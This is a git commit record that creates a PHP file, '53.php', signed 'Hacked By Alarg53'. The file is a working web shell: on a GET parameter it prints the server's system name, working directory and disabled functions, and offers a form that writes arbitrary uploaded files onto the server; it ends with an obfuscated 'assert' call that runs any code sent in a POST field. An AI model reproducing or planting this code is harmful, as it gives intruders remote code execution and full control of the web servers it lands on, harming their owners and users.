eea6dd206fadf8cc16d36a9c49934d6fcbb32d9a
alarg53 <alarg53@yopmail.com>
2018-04-21 06:27:13 +0200

    Create 53.php

---
+++ 53.php
@@ -0,0 +1,18 @@
+Hacked By Alarg53
+<?php
+error_reporting(0);
+if(isset($_GET[53]))
+    {
+        echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]<br>";
+        echo "<font color=#FFFFFF>[pwd]".getcwd()."[/pwd]<br>";
+        print "\n";$disable_functions = @ini_get("disable_functions");
+        echo "DisablePHP=".$disable_functions; print "<br>";
+        echo"<form method=post enctype=multipart/form-data>";
+        echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";
+          if($_POST["v"]==up)
+{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}  
+{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}}
+?>
+ 
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['wei']);?>
+"""
